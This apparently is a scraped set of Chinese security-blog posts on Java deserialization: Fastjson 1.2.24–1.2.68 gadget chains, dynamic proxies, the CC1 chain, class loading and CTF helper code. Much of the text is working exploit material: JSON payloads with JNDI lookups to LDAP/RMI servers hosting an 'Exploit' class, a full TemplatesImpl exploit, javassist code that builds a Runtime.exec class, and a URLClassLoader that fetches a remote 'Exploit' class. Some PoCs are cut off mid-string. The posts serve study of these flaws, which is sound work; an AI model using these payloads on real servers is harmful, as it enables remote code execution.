\u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 漏洞原理 JndiConverter类有个toObjectImpl方法\n存在JNDI注入漏洞\n但是这个类没有构造方法,无法通过fastjson反序列化触发\n但是这个继承了一个抽象类AbstractConverter\nAbstractConverter里的setAsText\n然后会调用其子类JndiConverter重写的toObjectImpl方法,从而触发JNDI注入\nexp\n1 2 3 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.xbean.propertyeditor.JndiConverter\\\u0026#34;,\u0026#34;+\u0026#34;\\\u0026#34;AsText\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:8085/SZbYoVCf\\\u0026#34;}\u0026#34;; JSON.parse(payload); 剩下的反序列化绕过\n1.2.66 反序列化漏洞 前提条件 开启AutoType； Fastjson \u0026lt;= 1.2.66； JNDI注入利用所受的JDK版本限制； org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包； br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包； com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包； 新Gadget绕过黑名单限制。\n1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。\norg.apache.shiro.realm.jndi.JndiRealmFactory类PoC：\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.shiro.realm.jndi.JndiRealmFactory\u0026#34;, \u0026#34;jndiNames\u0026#34;:[\u0026#34;ldap://localhost:1389/Exploit\u0026#34;], \u0026#34;Realms\u0026#34;:[\u0026#34;\u0026#34;]} br.com.anteros.dbcp.AnterosDBCPConfig类PoC：\n1 {\u0026#34;@type\u0026#34;:\u0026#34;br.com.anteros.dbcp.AnterosDBCPConfig\u0026#34;,\u0026#34;metricRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;}或{\u0026#34;@type\u0026#34;:\u0026#34;br.com.anteros.dbcp.AnterosDBCPConfig\u0026#34;,\u0026#34;healthCheckRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;} com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类\n1 {\u0026#34;@type\u0026#34;:\u0026#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\u0026#34;,\u0026#34;properties\u0026#34;: {\u0026#34;@type\u0026#34;:\u0026#34;java.util.Properties\u0026#34;,\u0026#34;UserTra 1.2.67反序列化漏洞（黑名单绕过） 前提条件 开启AutoType； Fastjson \u0026lt;= 1.2.67； JNDI注入利用所受的JDK版本限制； org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖； org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖； 漏洞原理 新Gadget绕过黑名单限制。\norg.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\u0026#34;, \u0026#34;jndiNames\u0026#34;:[\u0026#34;ldap://localhost:1389/Exploit\u0026#34;], \u0026#34;tm\u0026#34;: {\u0026#34;$ref\u0026#34;:\u0026#34;$.tm\u0026#34;}} org.apache.shiro.jndi.JndiObjectFactory类PoC：\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.shiro.jndi.JndiObjectFactory\u0026#34;,\u0026#34;resourceName\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;,\u0026#34;instance\u0026#34;:{\u0026#34;$ref\u0026#34;:\u0026#34;$.instance\u0026#34;}} poc\n1 2 3 4 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String poc = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\\\u0026#34;,\u0026#34; + \u0026#34; \\\u0026#34;jndiNames\\\u0026#34;:[\\\u0026#34;ldap://localhost:1234/ExportObject\\\u0026#34;], \\\u0026#34;tm\\\u0026#34;: {\\\u0026#34;$ref\\\u0026#34;:\\\u0026#34;$.tm\\\u0026#34;}}\u0026#34;; JSON.parse(poc); 1.2.68反序列化漏洞（expectClass绕过AutoType） 前提条件 Fastjson \u0026lt;= 1.2.68； 利用类必须是expectClass类的子类或实现类，并且不在黑名单中； 漏洞原理 本次绕过checkAutoType()函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过checkAutoType()函数执行恶意操作。\n简单地说，本次绕过checkAutoType()函数的攻击步骤为：\n先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数； 查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用; 漏洞复现 简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class VulAutoCloseable implements AutoCloseable { public VulAutoCloseable(String cmd) { try { Runtime.getRuntime().exec(cmd); } catch (Exception e) { e.printStackTrace(); } } @Override public void close() throws Exception { } } poc\n1 {\u0026#34;@type\u0026#34;:\u0026#34;java.lang.AutoCloseable\u0026#34;,\u0026#34;@type\u0026#34;:\u0026#34;org.example.VulAutoCloseable\u0026#34;,\u0026#34;cmd\u0026#34;:\u0026#34;calc\u0026#34;} 其他一些绕过黑名单的Gadget 这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。\n1.2.59 com.zaxxer.hikari.HikariConfig类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;com.zaxxer.hikari.HikariConfig\u0026#34;,\u0026#34;metricRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;}或{\u0026#34;@type\u0026#34;:\u0026#34;com.zaxxer.hikari.HikariConfig\u0026#34;,\u0026#34;healthCheckRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;} 1.2.61 org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\u0026#34;,\u0026#34;jndiName\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;,\u0026#34;Object\u0026#34;:\u0026#34;a\u0026#34;} 1.2.62 org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\u0026#34;,\u0026#34;jndiName\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;,\u0026#34;Object\u0026#34;:\u0026#34;a\u0026#34;} 1.2.68 org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\u0026#34;,\u0026#34;metricRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;}或{\u0026#34;@type\u0026#34;:\u0026#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\u0026#34;,\u0026#34;healthCheckRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;} com.caucho.config.types.ResourceRef类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;com.caucho.config.types.ResourceRef\u0026#34;,\u0026#34;lookupName\u0026#34;: \u0026#34;ldap://localhost:1389/Exploit\u0026#34;, \u0026#34;value\u0026#34;: {\u0026#34;$ref\u0026#34;:\u0026#34;$.value\u0026#34;}} 未知版本 org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\u0026#34;, \u0026#34;tmJndiName\u0026#34;: \u0026#34;ldap://localhost:1389/Exploit\u0026#34;, \u0026#34;tmFromJndi\u0026#34;: true, \u0026#34;transactionManager\u0026#34;: {\u0026#34;$ref\u0026#34;:\u0026#34;$.transactionManager\u0026#34;}} org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：\nJSON\n1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\u0026#34;, \u0026#34;tmJndiNa 利用$ref实现fastjson的反序列化 这是利用了fastjson的jsonpath\npoc\n1 2 3 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;[{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.lxraa.serialize.fastjson.Test\\\u0026#34;,\\\u0026#34;id\\\u0026#34;:123},{\\\u0026#34;$ref\\\u0026#34;:\\\u0026#34;$[0].id\\\u0026#34;}]\u0026#34;; {\\\u0026#34;$ref\\\u0026#34;:\\\u0026#34;$[0].id\\\u0026#34;} 反序列化时会调用Test类的getid方法 代码跟进到能看到invoke反射调用方法,\nmethod类似于Method method = getMethod(\u0026quot;getid\u0026quot;);\njavaObject是Test类\n","date":"2025-01-08T14:49:47+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/25_hueda339f65764f7844afcc8ab1b48c07c_207061_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/","title":"Fastjson1.2.62-1.2.68版本反序列化漏洞"},{"content":" dk8u65，最好是低一点的版本，因为有一条 Jndi 的链子；虽然说也是可以绕过，我们这里还是一步步来比较好。 Maven 3.6.3 1.2.22 \u0026lt;= Fastjson \u0026lt;= 1.2.24 pom.xml 导入如下所示\nXML\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-codec\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-codec\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.12\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 主要有两条攻击的链子，一条是基于 TemplatesImpl 的链子，另一条是基于 JdbcRowSetImpl 的链子。\nTemplatesImpl利用链 在前面cc3链的时候,利用的就是TemplatesImpl利用链,通过类加载器来执行恶意命令\n1 2 3 4 5 TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.defineClass() ClassLoader.defineClass() newInstance 前面需要一层层调用到getTransletInstance()方法,而如果fastjson可以直接调用getTransletInstance()方法,那么就省去前面的链子调用了\n而刚好getTransletInstance()是一个getter方法,但是getter方法调用是有条件的\n满足条件的getter：\n非静态方法 无参数 返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong 而这个方法返回的是抽象类,不满足条件\n寻找调用这个方法\n往上找到newTransformer,继续找\n找到getOutputProperties\n返回的是Properties类,继承了HashMap,自然继承了Map\n满足条件\n1 getOutputProperties-\u0026gt;newTransformer-\u0026gt;getTransletInstance payload\n1 2 3 4 final String evilClassPath = \u0026#34;E:\\\\\\\\javawork\\\\\\\\cc3\\\\\\\\src\\\\\\\\main\\\\\\\\java\\\\\\\\cc3\\\\\\\\calc.class\u0026#34;; final String NASTY_CLASS = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; String text1 = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;\u0026#34; + NASTY_CLASS + \u0026#34;\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;\u0026#34;+evilCode+\u0026#34;\\\u0026#34;],\u0026#39;_name\u0026#39;:\u0026#39;Drunkbaby\u0026#39;,\u0026#39;_tfactory\u0026#39;:{ },\\\u0026#34;_outputProperties\\\u0026#34;:{ },\u0026#34;; 不需要通过反射来修改,直接json字符串修改即可\n完整exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } return Base64.encodeBase64String(bos.toByteArray()); } public static void main(String[] args) throws Exception{ final String fileSeparator = System.getProperty(\u0026#34;file.separator\u0026#34;); final String evilClassPath = \u0026#34;E:\\\\\\\\javawork\\\\\\\\cc3\\\\\\\\src\\\\\\\\main\\\\\\\\java\\\\\\\\cc3\\\\\\\\calc.class\u0026#34;; String evilCode = readClass(evilClassPath); ParserConfig config = new ParserConfig(); final String NASTY_CLASS = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; String text1 = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;\u0026#34; + NASTY_CLASS + \u0026#34;\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;\u0026#34;+evilCode+\u0026#34;\\\u0026#34;],\u0026#39;_name\u0026#39;:\u0026#39;Drunkbaby\u0026#39;,\u0026#39;_tfactory\u0026#39;:{ },\\\u0026#34;_outputProperties\\\u0026#34;:{ },\u0026#34;; System.out.println(text1); Object obj = JSON.parseObject(text1,Object.class,config, Feature.SupportNonPublicField); evilCode传入的是base64编码的数据,但是动态加载类不会解码\n可以看到传入到_bytecodes已经变成字节码数组了\n说明base64解码在动态加载前就已经解码过了\n根据GPT所说\nBase64 数据的解码不是动态加载完成的，而是 JSON 库（如 FastJSON）在解析过程中完成的。JSON 库解析时，根据字段的类型（如 byte[][]），会将 Base64 编码的字符串转换为实际的字节数据。\n基于 JdbcRowSetImpl 的利用链 基于 JdbcRowSetImpl 的利用链主要有两种利用方式，即 JNDI + RMI 和 JNDI + LDAP，都是属于基于 Bean Property 类型的 JNDI 的利用方式。\n1. JNDI + RMI 利用的是JdbcRowSetImpl类下的setDataSourceName方法,用的是JNDI注入的Reference\npayload\n1 2 3 4 { \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://localhost:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } 看代码\n设置数据源,getter方法,满足fastjson反序列化调用的条件\n再看setAutoCommit方法\n跟进connect方法可以看到\n1 2 InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); 和JNDI注入时十分相似\n而且getDataSourceName()返回dataSourceName值是我们可控的\n用yakit的工具\n弹成功\n","date":"2025-01-08T14:49:43+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/24_huf13ef49576a26e60058adb4232b89236_327164_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/","title":"Fastjson-1.2.24版本漏洞分析"},{"content":"静态代理 代码步骤:\n1.接口\n1 2 3 4 5 //租房接口 public interface Rent { public void rent(); } 2.真实角色\n1 2 3 4 5 6 7 8 //房东 public class Host implements Rent { public void rent() { System.out.println(\u0026#34;房东出租房子\u0026#34;); } } 3.代理角色\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 public class Proxy { private Host host; public Proxy() { } public Proxy(Host host) { this.host = host; } public void rent() { fare(); host.rent(); } //看房 public void watch() { System.out.println(\u0026#34;中介带你看房\u0026#34;); } public void fare(){ System.out.println(\u0026#34;中介收费\u0026#34;); } } 4.客户\n1 2 3 4 5 6 7 public class Client { public static void main(String[] args) { Host host = new Host(); Proxy proxy = new Proxy(host); proxy.rent(); } } 动态代理 动态代理的角色和静态代理的一样。需要一个实体类，一个代理类，一个启动器。 动态代理的代理类是动态生成的，静态代理的代理类是我们提前写好的。 JDK的动态代理需要了解两个类\n核心 : InvocationHandler 调用处理程序类和 Proxy 代理类\nInvocationHandler：调用处理程序\npublic interface InvocationHandler ``` InvocationHandler是由代理实例的调用处理程序实现的接口\n每个代理实例都有一个关联的调用处理程序。\n1 Object invoke(Object proxy, 方法 method, Object[] args)； 当在代理实例上调用方法的时候，方法调用将被编码并分派到其调用处理程序的invoke()方法。\n参数：\nproxy – 调用该方法的代理实例 method -所述方法对应于调用代理实例上的接口方法的实例。方法对象的声明类将是该方法声明的接口，它可以是代理类继承该方法的代理接口的超级接口。 args -包含的方法调用传递代理实例的参数值的对象的阵列，或null如果接口方法没有参数。原始类型的参数包含在适当的原始包装器类的实例中，例如java.lang.Integer或java.lang.Boolean 。 Proxy : 代理\n1 public class Proxy extends Object implements Serializable Proxy提供了创建动态代理类和实例的静态方法，它也是由这些方法创建的所有动态代理类的超类。\n动态代理类 （以下简称为代理类 ）是一个实现在类创建时在运行时指定的接口列表的类，具有如下所述的行为。 代理接口是由代理类实现的接口。 代理实例是代理类的一个实例。\n1 public static Object newProxyInstance(ClassLoader loader, 类\u0026lt;?\u0026gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException 返回指定接口的代理类的实例，该接口将方法调用分派给指定的调用处理程序。\n参数\nloader – 类加载器来定义代理类 interfaces – 代理类实现的接口列表 h – 调度方法调用的调用处理函数 动态代理的代码实现 要写动态代理的代码，需要抓牢两个要点 ①：我们代理的是接口，而不是单个用户。\n②：代理类是动态生成的，而非静态定死。\n我只能说这种编程思想是真的牛逼，其实我们还可以实现任意接口的动态代理实现，在这里就不贴出来了。\n首先是我们的接口类\nUserService.java\n1 2 3 4 5 6 7 8 9 package src.JdkProxy.DynamicProxy; public interface UserService { public void add(); public void delete(); public void update(); public void query(); } 接着，我们需要用实体类去实现这个抽象类\nUserServiceImpl.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package src.JdkProxy.DynamicProxy; public class UserServiceImpl implements UserService{ @Override public void add() { System.out.println(\u0026#34;增加了一个用户\u0026#34;); } @Override public void delete() { System.out.println(\u0026#34;删除了一个用户\u0026#34;); } @Override public void update() { System.out.println(\u0026#34;更新了一个用户\u0026#34;); } @Override public void query() { System.out.println(\u0026#34;查询了一个用户\u0026#34;); } } 接着，是动态代理的实现类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package src.JdkProxy.DynamicProxy; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class UserProxyInvocationHandler implements InvocationHandler { // 被代理的接口 private UserService userService; public void setUserService(UserService userService) { this.userService = userService; } // 动态生成代理类实例 public Object getProxy(){ Object obj = Proxy.newProxyInstance(this.getClass().getClassLoader(), userService.getClass().getInterfaces(), this); return obj; } // 处理代理类实例，并返回结果 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { log(method); Object obj = method.invoke(userService, args); return obj; } //业务自定义需求 public void log(Method method){ System.out.println(\u0026#34;[Info] \u0026#34; + method.getName() + \u0026#34;方法被调用\u0026#34;); } } 最后编写我们的 Client，也就是启动器 Client.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package src.JdkProxy.DynamicProxy; import src.JdkProxy.DynamicProxy.UserServiceImpl; public class Client { public static void main(String[] args) { // 真实角色 UserServiceImpl userServiceImpl = new UserServiceImpl(); // 代理角色，不存在 UserProxyInvocationHandler userProxyInvocationHandler = new UserProxyInvocationHandler(); userProxyInvocationHandler.setUserService((UserService) userServiceImpl); // 设置要代理的对象 // 动态生成代理类 UserService proxy = (UserService) userProxyInvocationHandler.getProxy(); proxy.add(); proxy.delete(); proxy.update(); proxy.query(); } } cc1正链的分析 1 2 Constructor\u0026lt;?\u0026gt; constructor = clz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); // 允许访问私有构造函数 **实例化 ****AnnotationInvocationHandler**： 使用获取到的构造函数创建 AnnotationInvocationHandler 实例。这个实例负责处理代理对象的方法调用。 1 Object o = constructor.newInstance(Override.class, decoratemap); **强制转换为 ****InvocationHandler**： 将创建的实例强制转换为 InvocationHandler 类型，以便后续可以通过这个处理器处理代理对象的调用。 1 InvocationHandler invocationHandler = (InvocationHandler) o; 创建代理对象： 使用 Proxy.newProxyInstance() 方法创建一个动态代理对象，代理 Map 接口。此时，所有对 proxymap 的方法调用（如 entrySet()、get() 等）都会转发给 invocationHandler 的 invoke() 方法。 1 2 3 4 5 Map proxymap = (Map) Proxy.newProxyInstance( Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler ); 调用代理方法： 通过代理对象（proxymap）调用 entrySet() 方法。这个调用实际上会被转发到 InvocationHandler 的 invoke() 方法，进行处理。 1 proxymap.entrySet(); // 代理方法调用 最后将代理类的实例化\n1 Object ob = constructor.newInstance(Override.class,proxymap); 大多内容参考的是:Drunkbaby大佬的博客\n","date":"2025-01-08T14:40:39+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/23_huf9676a8800dc8cf9723afb54e95056be_155376_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","title":"java动态代理"},{"content":"ctrl+H 打开层级图\nctrl+alt+b 查看实现类\nCtrl+Alt+Shift+F7 选择all place查询 find usages\nctrl+shift+F8 清除断点\n导入jar包依赖 File-\u0026gt;Project Structure\n选择要加的jar包就导入相应的包了\n依赖 javassist 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.23.1-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 函数 序列化函数 1 2 3 4 5 6 7 8 9 public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } 1 2 3 4 5 6 private static void Serialize(Object o) throws Exception{ ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos); objectOutputStream.writeObject(o); System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray()))); } 反射函数 1 2 3 4 5 6 private static void SetValue(Object obj, String name, Object value) throws Exception{ Class cls = obj.getClass(); Field field = cls.getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } 重复利用代码 动态加载恶意类 1 2 3 4 5 6 7 8 9 10 11 12 TemplatesImpl templates = new TemplatesImpl(); SetValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;aaa\u0026#34;); //javassist生成恶意字节码 ClassPool pool = ClassPool.getDefault(); CtClass ctClass = pool.makeClass(\u0026#34;evilevil\u0026#34;); ctClass.setSuperclass(pool.get(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;)); CtConstructor constructor = CtNewConstructor.make(\u0026#34;public evilevil(){Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);}\u0026#34;,ctClass); ctClass.addConstructor(constructor); byte[] bytes = ctClass.toBytecode(); byte[][] codes = {bytes}; SetValue(templates, \u0026#34;_bytecodes\u0026#34;, codes); SetValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ","date":"2025-01-08T14:23:51+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java/22_hu1a38b88b30d2714f829ca328dca8e993_249171_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/java%E7%9F%A5%E8%AF%86%E7%82%B9/java/","title":"CTF Java"},{"content":"参考文章：https://blog.csdn.net/mole_exp/article/details/122768814\nJava中动态加载字节码的方法\n利用 URLClassLoader 加载远程class文件 1 2 3 4 5 6 7 8 9 10 11 12 13 public static void main(String[] args) { try { //使用file协议在本地寻找指定.class文件 //URL[] urls = new URL[]{new URL(\u0026#34;file:///Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/\u0026#34;)}; //使用http协议到远程地址寻找指定.class文件 URL[] urls = new URL[]{new URL(\u0026#34;http://127.0.0.1:8000/\u0026#34;)}; URLClassLoader urlClassLoader = new URLClassLoader(urls); Class clazz = urlClassLoader.loadClass(\u0026#34;Exploit\u0026#34;); clazz.newInstance(); } catch (Exception e) { e.printStackTrace(); } } 利用 ClassLoader#defineClass 直接加载字节码\n类加载 - 双亲委派模型 BootstrapClassLoader：启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.*.*都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。\nExtClassLoader：扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。\nAppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到。\nClassLoader.getParent() 可以获取用于委派的父级class loader，通常会返回null来表示bootstrap class loader。\n双亲委派模型的代码实现 如上图，实现双亲委派的代码都集中在 java.lang.ClassLoader#loadClass()方法中，其逻辑如下：\n先检查是否已被加载过;\n若没有加载过则调用父加载器的loadClass()方法；\n若父加载器为null则默认使用启动类加载器(Bootstrap ClassLoader)作为父加载器；\n如果父加载器加载类失败，抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。(findClass()最终会调用defineClass()加载字节码)\n注意：\n这里的“双亲”，指的并不是有两个父加载器，可能仅仅是英文“parent”的翻译。每个ClassLoader最多有一个父加载器，也就是parent变量。“双亲委派机制”指的就是优先让父加载器去加载类，如果父加载器没有成功加载到类，才由本ClassLoader加载。\n这样可以保证安全性，防止系统类被伪造(比如自定义java.lang.Object类，肯定是无法运行的)。\n对于Java程序来讲，一般的类是由AppClassLoader来加载的，而系统类则是由BootStrapClassLoader加载的。由于BootStrapClassLoader是在native层实现的，所以调用系统类的getClassLoader()方法会返回null。\n通俗理解 双亲委派机制是 Java 类加载器的重要设计原则，用于确保 Java 应用的安全性和稳定性。为了让这个机制更形象，以下是详细解释和具体例子。\n双亲委派机制的定义 双亲委派机制规定，当一个类加载器接收到类加载请求时，它会首先将这个请求委托给它的“父加载器”处理。只有当父加载器无法加载时，子加载器才会尝试自己加载。\n这种机制确保：\n类加载的唯一性：避免重复加载同一个类。 核心类的安全性：例如 java.lang.String 等核心类只能由根类加载器加载，防止被篡改。 形象的比喻 可以把双亲委派机制比作一个问题的求解过程，假设有一个学生、小组长、班主任和校长的层级关系：\n学生有个问题想解决（例如“加载某个类”）。 学生先问小组长（子加载器）。 小组长说：“先等等，我得先问班主任（父加载器）。” 班主任又说：“我得先请示校长（根类加载器）。” 如果校长知道答案，就会直接回答。 如果校长说：“我也不知道这个问题的答案”，班主任才会尝试自己解决，依次递归到学生。 这个过程保证了所有请求都从最高层级开始尝试解决，避免了低层级重复回答。\n而如果最高层都无法解决,就会让学生自行解决\n如果我们传入一个恶意类的字节码,这个系统里当然没有这个恶意类的加载器,所以学生自行解决会生成和加载这个恶意类,从而RCE(我是这么认为的,不对的话请指正)\njavassist Java 字节码以二进制的形式存储在 .class 文件中，每一个 .class 文件包含一个 Java 类或接口。Javaassist 就是一个用来 处理 Java 字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生成一个新的类对象，通过完全手动的方式。也就是当需要字节码的时候不需要手动另外新建类然后编译为class文件\n依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.23.1-GA\u0026lt;/version\u0026gt; 